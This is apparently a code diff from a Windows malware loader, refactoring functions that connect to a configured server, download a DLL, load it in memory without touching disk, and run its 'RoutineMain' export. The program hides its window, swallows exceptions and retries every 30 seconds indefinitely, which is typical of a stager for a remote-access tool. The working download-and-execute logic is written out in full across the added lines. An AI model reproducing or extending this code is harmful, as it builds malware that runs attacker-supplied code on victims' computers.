@@ -58,26 +58,27 @@ unsigned long _stdcall resolve(char *host)
 	return i;
 }
 
-DWORD _stdcall ConnectThread(LPVOID lParam)
+SOCKET ConnectServer()
 {
-	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
+	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);
 
 	struct sockaddr_in LocalAddr;
 	LocalAddr.sin_family = AF_INET;
 	LocalAddr.sin_port = htons(modify_data.ServerPort);
 	LocalAddr.sin_addr.S_un.S_addr = resolve(modify_data.ServerAddr);
 
-	SOCKET MainSocket = socket(AF_INET, SOCK_STREAM, 0);
-
 	if (connect(MainSocket, (PSOCKADDR)&LocalAddr, sizeof(LocalAddr)) == SOCKET_ERROR)
 	{
-		MsgErr("Can't Connect to Dll Server");
-
-		return 0; //connect error
+		return SOCKET_ERROR; //connect error
 	}
 
 	TurnonKeepAlive(MainSocket, 60);
 
+	return MainSocket;
+}
+
+DWORD GetDllData(SOCKET MainSocket, LPVOID& buf)
+{
 	MsgHead msgHead;
 	msgHead.dwCmd = SOCKET_DLLLOADER;
 	msgHead.dwSize = 0;
@@ -85,64 +86,84 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	if (!SendMsg(MainSocket, NULL, &msgHead))
 	{
 		MsgErr("Loader Request Can't Send");
-		shutdown(MainSocket, 0x02);
-		closesocket(MainSocket);
 
-		return 1;
+		return 0;
 	}
 
 	if (!RecvData(MainSocket, (char*)&msgHead, sizeof(MsgHead)))
 	{
 		MsgErr("Can't Recv Dll Data Head");
-		shutdown(MainSocket, 0x02);
-		closesocket(MainSocket);
 
-		return 1;
+		return 0;
 	}
 
-	char *buf = (char *)VirtualAlloc(msgHead.dwSize);
+	if (msgHead.dwCmd != CMD_DLLDATA)
+	{
+		MsgErr("Received dll head incorrect");
 
-	if (!RecvData(MainSocket, buf, msgHead.dwSize))
+		return 0;
+	}
+
+	buf = VirtualAlloc(msgHead.dwSize);
+
+	if (!RecvData(MainSocket, (char *)buf, msgHead.dwSize))
 	{
 		MsgErr("Can't Recv Dll Data");
 		VirtualFree(buf, msgHead.dwSize);
-		shutdown(MainSocket, 0x02);
-		closesocket(MainSocket);
 
-		return 1;
+		return 0;
 	}
+
+	return msgHead.dwSize;
+}
+
+DWORD LoadDll(DWORD dllSize, LPVOID buf)
+{
+	HMEMORYMODULE hModule = MemoryLoadLibrary(buf, dllSize);
+	VirtualFree(buf, dllSize);
+
+	if (hModule == NULL)
+	{
+		return (DWORD)WORKING_STATE::LOAD_ERR;
+	}
+
+	typedef DWORD(*_RoutineMain)(LPVOID lp);
+
+	_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
+	DWORD iRet = RoutineMain((LPVOID)&modify_data);
+	MemoryFreeLibrary(hModule);
+
+	return iRet;
+}
+
+DWORD _stdcall WorkThread(LPVOID lParam)
+{
+	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
+
+	SOCKET MainSocket = ConnectServer();
+
+	if (MainSocket == SOCKET_ERROR)
+	{
+		MsgErr("Can't Connect to Dll Server");
+
+		return (DWORD)WORKING_STATE::CONNECT_ERR;
+	}
+
+	LPVOID buf = NULL;
+
+	DWORD dllSize = GetDllData(MainSocket, buf);
 
 	shutdown(MainSocket, 0x02);
 	closesocket(MainSocket);
 
-	DWORD iRet;
-
-	if (msgHead.dwCmd == CMD_DLLDATA)
+	if (dllSize == 0)
 	{
-		HMEMORYMODULE hModule = MemoryLoadLibrary(buf, msgHead.dwSize);
-		VirtualFree(buf, msgHead.dwSize);
+		MsgErr(_T("Receive Err"));
 
-		if (hModule == NULL)
-		{
-			MsgErr(_T("Load Dll Err"));
-
-			return 2;
-		}
-
-		typedef DWORD (*_RoutineMain)(LPVOID lp);
-
-		_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
-		iRet = RoutineMain((LPVOID)&modify_data);
-		MemoryFreeLibrary(hModule);
-	}
-	else
-	{
-		MsgErr("Received dll incorrect");
-		VirtualFree(buf, msgHead.dwSize);
-		return 2;
+		return (DWORD)WORKING_STATE::RECEIVE_ERR;
 	}
 
-	return iRet;
+	return LoadDll(dllSize, buf);
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance,
@@ -162,7 +183,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 		NULL,
 		GetModuleHandleW(0),
 		NULL
-		);
+	);
 
 	ShowWindow(hwnd, SW_HIDE);
 	UpdateWindow(hwnd);
@@ -173,15 +194,13 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 	WSADATA lpWSAData;
 	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
 
+	DWORD state = (DWORD)WORKING_STATE::CONNECT_ERR;
+
 	while (true)
 	{
 		__try
 		{
-			if (ConnectThread(NULL) == STATE_EXIT)
-			{
-				Dbp("Exit Request to loader");
-				break;
-			}
+			state = WorkThread(NULL);
 		}
 		__except (1)
 		{
@@ -191,6 +210,12 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 #ifdef NDEBUG
 		Sleep(30000);
 #endif
+
+		if (state == (DWORD)WORKING_STATE::ON_EXIT)
+		{
+			Dbp("Exit Request to loader");
+			break;
+		}
 	}
 
 	WSACleanup();
